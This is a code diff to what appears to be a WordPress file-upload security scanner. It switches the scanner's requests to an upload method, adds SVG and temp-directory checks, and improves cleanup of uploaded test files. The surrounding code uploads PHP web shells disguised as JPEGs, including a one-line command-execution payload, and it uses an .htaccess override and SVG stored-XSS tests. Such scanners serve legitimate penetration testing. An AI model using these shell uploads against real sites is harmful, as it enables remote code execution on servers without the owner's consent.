@@ -187,7 +187,8 @@ class UploadScanner:
         }
         
         try:
-            response = await self.http.post(
+            # ✅ FIX: Use the new upload() method
+            response = await self.http.upload(
                 endpoint,
                 files=files,
                 data={'action': 'upload'}
@@ -251,7 +252,7 @@ class UploadScanner:
             
             try:
                 files = {'file': (filename, php_content, 'image/jpeg')}
-                response = await self.http.post(endpoint, files=files)
+                response = await self.http.upload(endpoint, files=files)
                 
                 if response.ok:
                     uploaded_url = self._extract_uploaded_url(response.text)
@@ -295,7 +296,7 @@ class UploadScanner:
             
             try:
                 files = {'file': ('shell.php', php_shell, mime)}
-                response = await self.http.post(endpoint, files=files)
+                response = await self.http.upload(endpoint, files=files)
                 
                 if response.ok:
                     uploaded_url = self._extract_uploaded_url(response.text)
@@ -338,7 +339,7 @@ class UploadScanner:
             
             try:
                 files = {'file': (filename, content, mime)}
-                response = await self.http.post(endpoint, files=files)
+                response = await self.http.upload(endpoint, files=files)
                 
                 if response.ok:
                     uploaded_url = self._extract_uploaded_url(response.text)
@@ -379,7 +380,7 @@ class UploadScanner:
             
             try:
                 files = {'file': (filename, php_shell, 'image/jpeg')}
-                response = await self.http.post(endpoint, files=files)
+                response = await self.http.upload(endpoint, files=files)
                 
                 if response.ok:
                     # Try to access in different locations
@@ -415,14 +416,14 @@ class UploadScanner:
         
         try:
             files = {'file': ('.htaccess', htaccess_content, 'text/plain')}
-            response = await self.http.post(endpoint, files=files)
+            response = await self.http.upload(endpoint, files=files)
             
             if response.ok:
                 # Now upload "image" with PHP
                 php_as_image = b'<?php system($_GET["c"]); ?>'
                 image_files = {'file': ('shell.jpg', php_as_image, 'image/jpeg')}
                 
-                response2 = await self.http.post(endpoint, files=image_files)
+                response2 = await self.http.upload(endpoint, files=image_files)
                 
                 if response2.ok:
                     uploaded_url = self._extract_uploaded_url(response2.text)
@@ -447,6 +448,19 @@ class UploadScanner:
         except Exception as e:
             logger.debug(f".htaccess test failed: {e}")
     
+
+    def _is_safe_svg(self, svg_content: bytes) -> bool:
+        """
+        Check if SVG is safe (no XSS).
+        ✅ FIX FP #13: Allow legitimate SVGs
+        """
+        svg_str = svg_content.decode('utf-8', errors='ignore').lower()
+        
+        # Dangerous SVG patterns
+        dangerous = ['<script', 'javascript:', 'onerror=', 'onload=', 'onclick=']
+        
+        return not any(pattern in svg_str for pattern in dangerous)
+
     async def _test_svg_xss(self, endpoint: str):
         """Test SVG with JavaScript (Stored XSS)."""
         logger.info("Testing SVG XSS...")
@@ -462,7 +476,7 @@ class UploadScanner:
         
         try:
             files = {'file': ('xss.svg', svg_xss, 'image/svg+xml')}
-            response = await self.http.post(endpoint, files=files)
+            response = await self.http.upload(endpoint, files=files)
             
             if response.ok:
                 uploaded_url = self._extract_uploaded_url(response.text)
@@ -546,6 +560,15 @@ class UploadScanner:
         
         return None
     
+
+    def _is_temp_directory(self, url: str) -> bool:
+        """
+        Check if upload is in temporary directory.
+        ✅ FIX FP #21: Temp uploads are often cleaned automatically
+        """
+        temp_patterns = ['/tmp/', '/temp/', '/cache/', '/uploads/temp/']
+        return any(pattern in url.lower() for pattern in temp_patterns)
+
     async def _verify_php_execution(self, url: str) -> bool:
         """Verify if uploaded PHP file executes."""
         try:
@@ -573,15 +596,35 @@ class UploadScanner:
     
     async def _cleanup_uploaded_files(self):
         """Attempt to clean up uploaded test files."""
+        if not self.uploaded_files:
+            return
+            
         logger.info(f"Cleaning up {len(self.uploaded_files)} uploaded files...")
         
         for file_url in self.uploaded_files:
             try:
-                # Try to delete via WordPress media API
-                # This is best-effort cleanup
-                await self.http.delete(file_url)
-            except:
-                pass
+                # ✅ FIX: Extract media ID from URL or try to find it
+                # Method 1: Try to extract ID from URL pattern
+                # /wp-content/uploads/2024/12/shell-123.php
+                import re
+                match = re.search(r'/wp-content/uploads/.*?([0-9]+)', file_url)
+                
+                if match:
+                    media_id = match.group(1)
+                    # Try to delete via REST API
+                    delete_response = await self.http.delete(
+                        f"/wp-json/wp/v2/media/{media_id}?force=true"
+                    )
+                    if delete_response.ok:
+                        logger.info(f"Deleted uploaded file: {file_url}")
+                    else:
+                        logger.debug(f"Could not delete {file_url} via REST API")
+                else:
+                    # Method 2: Try direct DELETE request (won't work but try anyway)
+                    logger.debug(f"Could not extract media ID from {file_url}, skipping cleanup")
+                    
+            except Exception as e:
+                logger.debug(f"Cleanup failed for {file_url}: {e}")
     
     def get_summary(self) -> Dict:
         """Get comprehensive summary."""
